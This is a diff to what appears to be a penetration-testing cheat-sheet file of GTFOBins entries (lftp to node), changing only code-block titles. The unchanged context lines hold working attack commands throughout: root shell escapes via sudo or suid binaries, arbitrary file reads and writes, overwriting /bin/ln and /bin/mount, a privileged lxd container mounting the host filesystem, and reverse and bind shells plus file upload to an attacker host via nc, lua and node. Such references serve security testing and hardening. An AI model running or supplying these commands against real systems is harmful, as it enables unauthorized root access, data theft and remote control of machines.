+```sh title:"GTFOBins lftp shell (sudo / suid / unprivileged)"
 lftp -c '!/bin/sh'
 ```
 <!-- cheat
@@ -5026,7 +5106,7 @@ lftp -c '!/bin/sh'
 
 The result is displayed in a TUI interface.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins links file-read (sudo / suid / unprivileged)"
 links $file_in
 ```
 <!-- cheat
@@ -5039,7 +5119,7 @@ var file_in
 
 This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.
 
-```sh title:"sudo"
+```sh title:"GTFOBins ln privilege-escalation (sudo)"
 ln -fs /bin/sh /bin/ln
 ln
 ```
@@ -5054,7 +5134,7 @@ This might not work if run by unprivileged users depending on the system configu
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins loginctl shell (sudo / unprivileged)"
 loginctl user-status
 !/bin/sh
 ```
@@ -5067,7 +5147,7 @@ loginctl user-status
 
 This command is picky about file permissions. An existing config file can be used as weel, provided that it contains a mail directive.
 
-```sh title:"sudo"
+```sh title:"GTFOBins logrotate shell (sudo)"
 echo -e '$tmp_file {\nmail x@x.x\n}' >$tmp_file
 echo '/bin/sh 0<&2 1>&2' >$tmp_file
 logrotate -m $tmp_file -f $tmp_file
@@ -5080,7 +5160,7 @@ var tmp_file
 
 The first word is returned in a error message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins logrotate file-read (sudo / suid / unprivileged)"
 logrotate $file_in
 ```
 <!-- cheat
@@ -5091,7 +5171,7 @@ var file_in
 
 The content is written in a log file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins logrotate file-write (sudo / suid / unprivileged)"
 logrotate -l $file_out $data
 ```
 <!-- cheat
@@ -5105,7 +5185,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins logsave shell (sudo / suid / unprivileged)"
 logsave /dev/null /bin/sh -i
 ```
 <!-- cheat
@@ -5113,7 +5193,9 @@ logsave /dev/null /bin/sh -i
 
 #### logsave shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins logsave shell - suid override (suid variant)"
 logsave /dev/null /bin/sh -i -p
 ```
 <!-- cheat
@@ -5125,7 +5207,7 @@ logsave /dev/null /bin/sh -i -p
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins look file-read (sudo / suid / unprivileged)"
 look '' $file_in
 ```
 <!-- cheat
@@ -5138,7 +5220,7 @@ var file_in
 
 This requires `cups` to be installed. Run the following on the attacker box beforehand:  1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer; 2. `lpadmin -d printer` to set the new printer as default; 3. `cupsctl --remote-any` to enable printing from the Internet.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins lp upload (sudo / suid / unprivileged)"
 lp $file_in -h $lhost
 ```
 <!-- cheat
@@ -5152,7 +5234,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ltrace shell (sudo / unprivileged)"
 ltrace -b -L /bin/sh
 ```
 <!-- cheat
@@ -5162,7 +5244,7 @@ ltrace -b -L /bin/sh
 
 The file is parsed as a configuration file and its content is shown as error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ltrace file-read (sudo / suid / unprivileged)"
 ltrace -F $file_in /dev/null
 ```
 <!-- cheat
@@ -5173,7 +5255,7 @@ var file_in
 
 The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F $data`.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ltrace file-write (sudo / unprivileged)"
 ltrace -s 999 -o $file_in ltrace -F $data
 ```
 <!-- cheat
@@ -5187,7 +5269,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins lua shell (sudo / suid / unprivileged)"
 lua -e 'os.execute("/bin/sh")'
 ```
 <!-- cheat
@@ -5197,7 +5279,7 @@ lua -e 'os.execute("/bin/sh")'
 
 This requires `lua-socket` to be available.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins lua reverse-shell (sudo / suid / unprivileged)"
 lua -e '
   local s=require("socket");
   local t=assert(s.tcp());
@@ -5217,7 +5299,7 @@ import lports
 
 This requires `lua-socket` to be available.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins lua bind-shell (sudo / suid / unprivileged)"
 lua -e '
   local k=require("socket");
   local s=assert(k.bind("*",$lport));
@@ -5235,7 +5317,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins lua file-read (sudo / suid / unprivileged)"
 lua -e 'local f=io.open("$file_in", "rb"); io.write(f:read("*a")); io.close(f);'
 ```
 <!-- cheat
@@ -5246,7 +5328,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins lua file-write (sudo / suid / unprivileged)"
 lua -e 'local f=io.open("$file_out", "wb"); f:write("$data"); io.close(f);'
 ```
 <!-- cheat
@@ -5258,7 +5340,7 @@ var file_out
 
 This requires `lua-socket` to be available.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins lua download (sudo / suid / unprivileged)"
 lua -e '
   local k=require("socket");
   local s=assert(k.bind("*",$lport));
@@ -5278,7 +5360,7 @@ var file_out
 
 This requires `lua-socket` to be available.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins lua upload (sudo / suid / unprivileged)"
 lua -e '
   local f=io.open("$file_in", "rb")
   local d=f:read("*a")
@@ -5301,7 +5383,7 @@ var file_in
 
 This allows to run Lua code (`...`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins lualatex inherit (inherits from lua) (sudo / suid / unprivileged)"
 lualatex -shell-escape '\directlua{...}\end'
 ```
 <!-- cheat
@@ -5313,7 +5395,7 @@ lualatex -shell-escape '\directlua{...}\end'
 
 This allows to run Lua code (`...`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins luatex inherit (inherits from lua) (sudo / suid / unprivileged)"
 luatex -shell-escape '\directlua{...}\end'
 ```
 <!-- cheat
@@ -5325,7 +5407,7 @@ luatex -shell-escape '\directlua{...}\end'
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins lwp-download file-read (sudo / unprivileged)"
 lwp-download file://$file_in /dev/stdout
 ```
 <!-- cheat
@@ -5336,7 +5418,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins lwp-download file-write #1 (sudo / unprivileged)"
 echo $data >$tmp_file
 lwp-download file://$tmp_file $file_out
 ```
@@ -5350,7 +5432,7 @@ var tmp_file
 
 This actually copies a file to a destination.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins lwp-download file-write #2 (sudo / unprivileged)"
 lwp-download file://$file_in $file_out
 ```
 <!-- cheat
@@ -5362,7 +5444,7 @@ var file_out
 
 The destination file `$file_out` can be omitted, in that case the file is saved to `input-file` in the current working directory.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins lwp-download download (sudo / unprivileged)"
 lwp-download $scheme://$lhost$file_in $file_out
 ```
 <!-- cheat
@@ -5378,7 +5460,7 @@ var file_out
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins lwp-request file-read (sudo / unprivileged)"
 lwp-request file://$file_in
 ```
 <!-- cheat
@@ -5391,7 +5473,7 @@ var file_in
 
 The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins lxd shell #1 (sudo / suid)"
 lxc init ubuntu:16.04 x -c security.privileged=true
 lxc config device add x x disk source=/ path=/mnt/ recursive=true
 lxc start x
@@ -5404,7 +5486,7 @@ lxc exec x /bin/sh
 
 This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):  ``` git clone https://github.com/saghul/lxd-alpine-builder cd lxd-alpine-builder sudo ./build-alpine -a i686 ```
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins lxd shell #2 (sudo / suid)"
 lxc image import ./alpine*.tar.gz --alias x
 lxc init x x -c security.privileged=true
 lxc config device add x x disk source=/ path=/mnt/ recursive=true
@@ -5420,7 +5502,7 @@ lxc exec x /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins m4 shell (sudo / suid / unprivileged)"
 echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
 ```
 <!-- cheat
@@ -5430,7 +5512,7 @@ echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins m4 command (sudo / suid / unprivileged)"
 echo 'esyscmd($cmd_file)' | m4
 ```
 <!-- cheat
@@ -5441,7 +5523,7 @@ var cmd_file
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins m4 file-read (sudo / suid / unprivileged)"
 m4 $file_in
 ```
 <!-- cheat
@@ -5454,7 +5536,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins mail shell #1 (sudo / suid / unprivileged)"
 mail --exec='!/bin/sh'
 ```
 <!-- cheat
@@ -5464,7 +5546,7 @@ mail --exec='!/bin/sh'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins mail shell #2 (sudo / suid / unprivileged)"
 mail -f /etc/hosts
 !/bin/sh
 ```
@@ -5477,7 +5559,7 @@ mail -f /etc/hosts
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins make shell (sudo / suid / unprivileged)"
 make --eval='$(shell /bin/sh 1>&0)' .
 ```
 <!-- cheat
@@ -5487,7 +5569,7 @@ make --eval='$(shell /bin/sh 1>&0)' .
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins make file-read (sudo / suid / unprivileged)"
 make -s --eval='$(file >/dev/stdout,$(file <$file_in))' .
 ```
 <!-- cheat
@@ -5498,7 +5580,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins make file-write (sudo / suid / unprivileged)"
 make -s --eval='$(file >$file_out,$data)' .
 ```
 <!-- cheat
@@ -5512,7 +5594,7 @@ var file_out
 
 This requires GNU `troff` (`groff`) to be installed.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins man shell (sudo / suid / unprivileged)"
 man '-H/bin/sh #' man
 ```
 <!-- cheat
@@ -5522,7 +5604,7 @@ man '-H/bin/sh #' man
 
 The file is shown somehow formatted and displayed in the default pager.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins man file-read (sudo / suid / unprivileged)"
 man $file_in
 ```
 <!-- cheat
@@ -5533,7 +5615,7 @@ var file_in
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins man inherit (inherits from less) (sudo / suid / unprivileged)"
 man man
 ```
 <!-- cheat
@@ -5545,7 +5627,7 @@ man man
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins mawk shell (sudo / suid / unprivileged)"
 mawk 'BEGIN {system("/bin/sh")}'
 ```
 <!-- cheat
@@ -5555,7 +5637,7 @@ mawk 'BEGIN {system("/bin/sh")}'
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins mawk file-read (sudo / suid / unprivileged)"
 mawk '//' $file_in
 ```
 <!-- cheat
@@ -5566,7 +5648,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins mawk file-write (sudo / suid / unprivileged)"
 mawk 'BEGIN { print "$data" > "$file_out" }'
 ```
 <!-- cheat
@@ -5582,7 +5664,7 @@ Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.
 
 Start the following command to open the TUI interface, then:  1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell.  After the shell, exit with `Ctrl-A x`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins minicom shell #1 (sudo / suid / unprivileged)"
 minicom -D /dev/null
 ```
 <!-- cheat
@@ -5592,7 +5674,7 @@ minicom -D /dev/null
 
 After the shell, exit with `Ctrl-A x`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins minicom shell #2 (sudo / suid / unprivileged)"
 echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >$tmp_file
 minicom -D /dev/null -S $tmp_file
 reset^J
@@ -5607,7 +5689,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins more shell (sudo / suid / unprivileged)"
 more /etc/hosts
 !/bin/sh
 ```
@@ -5618,7 +5700,7 @@ more /etc/hosts
 
 The file is displayed in the terminal interface.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins more file-read (sudo / suid / unprivileged)"
 more $file_in
 ```
 <!-- cheat
@@ -5631,7 +5713,7 @@ var file_in
 
 This requires a valid SSH access.
 
-```sh title:"sudo"
+```sh title:"GTFOBins mosh-server shell (sudo)"
 mosh --server=mosh-server localhost /bin/sh
 ```
 <!-- cheat
@@ -5643,7 +5725,7 @@ mosh --server=mosh-server localhost /bin/sh
 
 The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins mosquitto file-read (sudo / suid / unprivileged)"
 mosquitto -c $file_in
 ```
 <!-- cheat
@@ -5656,7 +5738,7 @@ var file_in
 
 This overrides `mount` itself with a shell (or any other executable).
 
-```sh title:"sudo"
+```sh title:"GTFOBins mount privilege-escalation (sudo)"
 mount -o bind /bin/sh /bin/mount
 mount
 ```
@@ -5669,7 +5751,7 @@ mount
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins msfconsole inherit (inherits from irb) (sudo / unprivileged)"
 msfconsole
 irb
 ```
@@ -5682,7 +5764,7 @@ irb
 
 The file is parsed and displayed as a Java `.properties` file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins msgattrib file-read (sudo / suid / unprivileged)"
 msgattrib -P $file_in
 ```
 <!-- cheat
@@ -5695,7 +5777,7 @@ var file_in
 
 The file is parsed and displayed as a Java `.properties` file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins msgcat file-read (sudo / suid / unprivileged)"
 msgcat -P $file_in
 ```
 <!-- cheat
@@ -5708,7 +5790,7 @@ var file_in
 
 The file is parsed and displayed as a Java `.properties` file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins msgconv file-read (sudo / suid / unprivileged)"
 msgconv -P $file_in
 ```
 <!-- cheat
@@ -5721,7 +5803,7 @@ var file_in
 
 The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins msgfilter shell (sudo / suid / unprivileged)"
 echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
 ```
 <!-- cheat
@@ -5729,7 +5811,9 @@ echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
 
 #### msgfilter shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins msgfilter shell - suid override (suid variant)"
 echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
 ```
 <!-- cheat
@@ -5739,7 +5823,7 @@ echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
 
 The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins msgfilter file-read (sudo / suid / unprivileged)"
 msgfilter -P -i $file_in /bin/cat
 ```
 <!-- cheat
@@ -5752,7 +5836,7 @@ var file_in
 
 The file is parsed and displayed as a Java `.properties` file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins msgmerge file-read (sudo / suid / unprivileged)"
 msgmerge -P $file_in /dev/null
 ```
 <!-- cheat
@@ -5765,7 +5849,7 @@ var file_in
 
 The file is parsed and displayed as a Java `.properties` file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins msguniq file-read (sudo / suid / unprivileged)"
 msguniq -P $file_in
 ```
 <!-- cheat
@@ -5778,7 +5862,7 @@ var file_in
 
 The file is actually parsed, thus the content is corrupted by error prints.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins mtr file-read (sudo / unprivileged)"
 mtr --raw -F $file_in
 ```
 <!-- cheat
@@ -5791,7 +5875,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins multitime shell (sudo / suid / unprivileged)"
 multitime /bin/sh
 ```
 <!-- cheat
@@ -5799,7 +5883,9 @@ multitime /bin/sh
 
 #### multitime shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins multitime shell - suid override (suid variant)"
 multitime /bin/sh -p
 ```
 <!-- cheat
@@ -5811,7 +5897,7 @@ multitime /bin/sh -p
 
 The file is leaked as error messages.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins mutt file-read (sudo / unprivileged)"
 mutt -F $file_in
 ```
 <!-- cheat
@@ -5824,7 +5910,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins mv file-write (sudo / suid / unprivileged)"
 echo $data >$tmp_file
 mv $tmp_file $file_out
 ```
@@ -5838,7 +5924,7 @@ var tmp_file
 
 This can be used to move and then read or write files from a restricted file systems or with elevated privileges.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins mv privilege-escalation (sudo / suid)"
 mv $file_in $file_out
 ```
 <!-- cheat
@@ -5852,7 +5938,7 @@ var file_out
 
 Partial content is leaked as error messages.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins mypy file-read (sudo / unprivileged)"
 mypy $file_in
 ```
 <!-- cheat
@@ -5863,7 +5949,7 @@ var file_in
 
 Partial content is leaked as error messages inside some XML tags.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins mypy file-write (sudo / unprivileged)"
 mypy $file_in --junit-xml $file_out
 ```
 <!-- cheat
@@ -5879,7 +5965,7 @@ A valid MySQL server must be available to connect to.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins mysql shell (sudo / suid / unprivileged)"
 mysql -e '\! /bin/sh'
 ```
 <!-- cheat
@@ -5889,7 +5975,7 @@ mysql -e '\! /bin/sh'
 
 The following loads the `$lib` shared object.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins mysql library-load (sudo / suid / unprivileged)"
 mysql --default-auth ../../../../.$lib
 ```
 <!-- cheat
@@ -5902,7 +5988,7 @@ var lib
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nano shell #1 (sudo / suid / unprivileged)"
 nano
 ^R^X
 reset; sh 1>&0 2>&0
@@ -5914,7 +6000,7 @@ reset; sh 1>&0 2>&0
 
 The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nano shell #2 (sudo / suid / unprivileged)"
 nano -s /bin/sh
 /bin/sh
 ^T^T
@@ -5924,7 +6010,9 @@ nano -s /bin/sh
 
 #### nano shell #2 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins nano shell #2 - suid override (suid variant)"
 nano -s '/bin/sh -p'
 /bin/sh -p
 ^T^T
@@ -5936,7 +6024,7 @@ nano -s '/bin/sh -p'
 
 The file content is displayed in the terminal interface.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nano file-read (sudo / suid / unprivileged)"
 nano $file_in
 ```
 <!-- cheat
@@ -5947,7 +6035,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nano file-write (sudo / suid / unprivileged)"
 nano $file_out
 $data
 ^O
@@ -5963,7 +6051,7 @@ var file_out
 
 The file content is treated as command line options and disclosed throught error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nasm file-read (sudo / suid / unprivileged)"
 nasm -@ $file_in
 ```
 <!-- cheat
@@ -5980,7 +6068,7 @@ Alias of [gawk](#gawk). All techniques from `gawk` apply.
 
 This only works with netcat traditional.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nc reverse-shell (sudo / suid / unprivileged)"
 nc -e /bin/sh $lhost $lport
 ```
 <!-- cheat
@@ -5992,7 +6080,7 @@ import lports
 
 This only works with netcat traditional.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nc bind-shell (sudo / suid / unprivileged)"
 nc -l -p $lport -e /bin/sh
 ```
 <!-- cheat
@@ -6003,7 +6091,7 @@ import lports
 
 The file is actually written by the invoking shell.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nc download #1 (sudo / suid / unprivileged)"
 nc -l -p $lport >$file_out
 ```
 <!-- cheat
@@ -6015,7 +6103,7 @@ var file_out
 
 The file is actually written by the invoking shell.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nc download #2 (sudo / suid / unprivileged)"
 nc $lhost $lport >$file_out
 ```
 <!-- cheat
@@ -6028,7 +6116,7 @@ var file_out
 
 The file is actually read by the invoking shell.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nc upload #1 (sudo / suid / unprivileged)"
 nc -l -p $lport <$file_in
 ```
 <!-- cheat
@@ -6040,7 +6128,7 @@ var file_in
 
 The file is actually read by the invoking shell.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nc upload #2 (sudo / suid / unprivileged)"
 nc $lhost $lport <$file_in
 ```
 <!-- cheat
@@ -6055,7 +6143,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ncdu shell (sudo / suid / unprivileged)"
 ncdu
 b
 ```
@@ -6068,7 +6156,7 @@ b
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ncftp shell (sudo / suid / unprivileged)"
 ncftp
 !/bin/sh
 ```
@@ -6077,7 +6165,9 @@ ncftp
 
 #### ncftp shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins ncftp shell - suid override (suid variant)"
 ncftp
 !/bin/sh -p
 ```
@@ -6090,7 +6180,7 @@ ncftp
 
 This allows to run Perl code (`...`).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins needrestart inherit (inherits from perl) (sudo / unprivileged)"
 echo '...' >$tmp_file
 needrestart -c $tmp_file
 ```
@@ -6104,7 +6194,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins neofetch shell (sudo / unprivileged)"
 echo 'exec /bin/sh' >$tmp_file
 neofetch --config $tmp_file
 ```
@@ -6116,7 +6206,7 @@ var tmp_file
 
 The file content is used as the logo while some other information is displayed on its right.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins neofetch file-read (sudo / unprivileged)"
 neofetch --ascii $file_in
 ```
 <!-- cheat
@@ -6129,7 +6219,7 @@ var file_in
 
 The content is actually parsed and corrupted by the command.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins nft file-read (sudo / unprivileged)"
 nft -f $file_in
 ```
 <!-- cheat
@@ -6142,7 +6232,7 @@ var file_in
 
 Pull a remote file to disk.
 
-```sh title:"sudo"
+```sh title:"GTFOBins nginx download (sudo)"
 cat >$tmp_file <<EOF
 user root;
 http {
@@ -6166,7 +6256,7 @@ var tmp_file
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo"
+```sh title:"GTFOBins nginx upload (sudo)"
 cat >$tmp_file <<EOF
 user root;
 http {
@@ -6190,7 +6280,7 @@ var tmp_file
 
 Alternatively, the `ssl_engine` directive can be used.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nginx library-load (sudo / suid / unprivileged)"
 cat >$tmp_file <<EOF
 load_module $lib
 EOF
@@ -6208,7 +6298,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nice shell (sudo / suid / unprivileged)"
 nice /bin/sh
 ```
 <!-- cheat
@@ -6216,7 +6306,9 @@ nice /bin/sh
 
 #### nice shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins nice shell - suid override (suid variant)"
 nice /bin/sh -p
 ```
 <!-- cheat
@@ -6228,7 +6320,7 @@ nice /bin/sh -p
 
 The read file content is corrupted by a leading space added to each line.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nl file-read (sudo / suid / unprivileged)"
 nl -bn -w1 -s '' $file_in
 ```
 <!-- cheat
@@ -6241,7 +6333,7 @@ var file_in
 
 The file content is treated as command line options and disclosed through error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nm file-read (sudo / suid / unprivileged)"
 nm $file_in
 ```
 <!-- cheat
@@ -6254,7 +6346,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nmap shell (sudo / suid / unprivileged)"
 nmap --interactive
 !/bin/sh
 ```
@@ -6265,7 +6357,7 @@ nmap --interactive
 
 The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nmap file-read (sudo / suid / unprivileged)"
 nmap -iL $file_in
 ```
 <!-- cheat
@@ -6276,7 +6368,7 @@ var file_in
 
 The payload appears inside the regular nmap output.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nmap file-write (sudo / suid / unprivileged)"
 nmap -oG=$file_out $data
 ```
 <!-- cheat
@@ -6288,7 +6380,7 @@ var file_out
 
 This allows to run Lua code (`...`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins nmap inherit (inherits from lua) (sudo / suid / unprivileged)"
 echo '...' >$tmp_file
 nmap --script=$tmp_file
 ```
@@ -6302,7 +6394,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"capabilities / sudo / suid / unprivileged"
+```sh title:"GTFOBins node shell (capabilities / sudo / suid / unprivileged)"
 node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
 ```
 <!-- cheat
@@ -6310,7 +6402,9 @@ node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
 
 #### node shell - capabilities override
 
-```sh title:"capabilities variant"
+capabilities variant
+
+```sh title:"GTFOBins node shell - capabilities override (capabilities variant)"
 node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
 ```
 <!-- cheat
@@ -6318,7 +6412,9 @@ node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0
 
 #### node shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins node shell - suid override (suid variant)"
 node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
 ```
 <!-- cheat
@@ -6328,7 +6424,7 @@ node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins node reverse-shell (sudo / suid / unprivileged)"
 node -e 'sh = require("child_process").spawn("/bin/sh");
 require("net").connect($lport, "$lhost", function () {
   this.pipe(sh.stdin);
@@ -6343,7 +6439,9 @@ import lports
 
 #### node reverse-shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
